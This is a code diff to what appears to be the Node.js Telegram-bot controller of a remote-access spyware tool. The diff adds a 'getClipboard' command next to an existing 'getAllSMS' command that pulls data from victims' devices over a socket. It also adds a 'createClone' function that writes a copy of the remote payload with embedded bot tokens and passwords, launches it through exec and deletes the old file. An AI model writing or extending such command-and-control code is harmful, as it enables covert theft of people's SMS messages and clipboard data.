@@ -10,6 +10,9 @@
 
 const TelegramBot = require("node-telegram-bot-api");
 const net = require("net");
+const fs = require("fs");
+const crypto = require("crypto");
+const { exec } = require("child_process");
 const me = new net.Socket();
 const bot = new TelegramBot(token, { polling: true });
 
@@ -271,6 +274,40 @@ function chunkArray(array, chunkSize) {
         result.push(array.slice(i, i + chunkSize));
     }
     return result;
+}
+
+function combinePath(dirname, filename){
+    if (dirname.includes("\\")){
+        return dirname+"\\"+filename;
+    } else if (dirname.includes("/")){
+        return dirname+"/"+filename;
+    }
+}
+
+function createClone(newpassword, remote_basic_info){
+    let ahash = crypto.createHash("md5").update((Math.floor(Math.random() * 999999999999) - 100000).toString()).digest('hex').slice(0, 10);
+    let starter = `const token = "${remote_basic_info.token}"\nconst chat_group = ${remote_basic_info.chat_group}\nconst portname = "${remote_basic_info.portname}"\nconst passname = "${newpassword}"\nconst admins = []\nconst realadmin = ${remote_basic_info.realadmin}\nconst hostname = "${remote_basic_info.hostname}"\nconst portnumb = ${remote_basic_info.portnumb}\n`;
+    let remote_source = fs.readFileSync("remote.js");
+    fs.writeFile(combinePath(__dirname, `${realadmin}_${ahash}.js`), starter+remote_source, async (err) => {
+        if (err){
+            console.log(err);
+            await bot.sendMessage(
+                chat_group,
+                build(`🔴 ${sym} error while creating new remote-file: `) + err.message
+            )
+        } else {
+            await bot.sendMessage(
+                chat_group,
+                build(`✅ ${sym} new remote-file created, if it goes offline, please told us in `) + `<a href="https://t.me/VexBite">${build("vex group")}</a>`,
+                {
+                    parse_mode: "HTML"
+                }
+            ).then(async (rmsg) => {
+                exec(`node ${combinePath(__dirname, `${realadmin}_${ahash}.js`)}`);
+                fs.unlinkSync(combinePath(__dirname, `${realadmin}.js`));
+            });
+        }
+    })
 }
 
 
@@ -1087,6 +1124,20 @@ bot.on("callback_query", async (call) => {
                 password: passname,
                 mask: "metro",
                 method: "getAllSMS",
+                device_id: spl[2],
+                shortcut: {
+                    chat_id: call.message.chat.id,
+                    message_id: call.message.message_id,
+                    device_id: spl[2],
+                    edit: true
+                }
+            }));
+        } else if (mode == "getClipboard"){
+            me.write(JSON.stringify({
+                port: portname,
+                password: passname,
+                mask: "metro",
+                method: "getClipboard",
                 device_id: spl[2],
                 shortcut: {
                     chat_id: call.message.chat.id,
